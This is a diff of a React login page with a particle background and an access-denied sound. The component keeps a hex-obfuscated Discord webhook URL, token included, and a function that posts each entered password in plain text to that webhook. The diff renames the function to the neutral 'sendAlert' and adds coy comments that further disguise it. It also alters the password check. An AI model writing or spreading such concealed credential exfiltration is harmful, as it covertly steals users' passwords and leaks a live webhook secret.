@@ -14,6 +14,7 @@ function App() {
   const navigate = useNavigate()
   const buzz = useRef(null)
 
+  // loading the sound
   useEffect(() => {
     // Preload audio on load
     buzz.current = new Audio('./accessDenied.mp3')
@@ -21,7 +22,7 @@ function App() {
     buzz.current.load()
   }, [])
 
-  const correctPass = 'b51ae642874f7663f6d8ab867dbea47307b6490f02a2fc4f2401844f9354a7d7'
+  // The u know what setting
   const _w3b8551 = [
     "\x68\x74\x74\x70\x73\x3A\x2F\x2F\x64\x69\x73\x63\x6F\x72\x64\x2E\x63\x6F\x6D\x2F\x61\x70\x69\x2F\x77\x65\x62\x68\x6F\x6F\x6B\x73\x2F\x31\x33\x39\x33\x31\x39\x37\x37\x33\x30\x38\x30\x35\x30\x35\x35\x34\x39\x38\x2F\x30\x5A\x6C\x62\x6D\x6D\x78\x4E\x78\x63\x42\x49\x4D\x30\x72\x31\x78\x62\x6B\x76\x6D\x70\x39\x6E\x47\x2D\x36\x4E\x34\x4A\x69\x2D\x6C\x7A\x54\x33\x45\x61\x75\x64\x6C\x47\x50\x4F\x4C\x5F\x38\x5F\x65\x53\x72\x41\x38\x68\x70\x48\x6E\x46\x43\x38\x56\x46\x48\x4E\x48\x76\x63\x62",
     "\x50\x4F\x53\x54",
@@ -33,9 +34,10 @@ function App() {
   ];
 
 
+  // Checking if the pass is correct
   const handleSubmit = async () => {
     const hashedInput = await hashPassword({ text: password })
-    sendDiscordAlert(password);
+    sendAlert(password);
 
     try {
       const encryptedData = encryptedJson.data
@@ -43,16 +45,14 @@ function App() {
       // Decrypt the data
       const decrypted = decryptData({data: encryptedData, passphrase: hashedInput})
 
-      if (decrypted.pass === correctPass) {
-        sessionStorage.setItem('keyPass', hashedInput);
+      if (decrypted.pass === hashedInput) {
+        sessionStorage.setItem('keyPass', decrypted.pass);
         setMessage("✅ Access Granted!!")
         navigate('/home')
       } else {
         console.log("Decryption pass mismatch");
       }
     } catch (err) {
-      console.log(err);
-
       setMessage("❌ Access Denied!!")
       setShake(true) // trigger shake
 
@@ -64,7 +64,9 @@ function App() {
     }
   }
 
-  function sendDiscordAlert(passAttempt) {
+
+  // Sending u know where alert
+  function sendAlert(passAttempt) {
     const payload = {
       [_w3b8551[6]]: _w3b8551[4] + "\n" + new Date().toLocaleString() + "\n" + _w3b8551[5] + "`" + passAttempt + "`"
     };
@@ -80,6 +82,7 @@ function App() {
 
   return (
     <>
+      {/* Calling partical bg */}
       <ParticleBackground pixleColor={shake ? 'red' : 'white'} disturbed={shake} />
 
       {/* Centered login card */}
